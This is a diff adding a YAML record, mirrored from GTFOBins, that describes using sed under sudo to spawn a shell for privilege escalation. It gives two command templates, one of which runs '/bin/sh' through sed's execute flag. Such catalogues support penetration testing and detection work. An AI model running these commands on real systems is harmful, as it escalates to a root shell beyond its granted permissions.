@@ -1,0 +1,25 @@
+id: gtfobins/sed/shell/sudo
+type: binary
+platform: linux
+name: sed
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+- template: sed e
+references:
+- https://gtfobins.github.io/gtfobins/sed/
+tags:
+- linux
+- unix
+- gtfobins
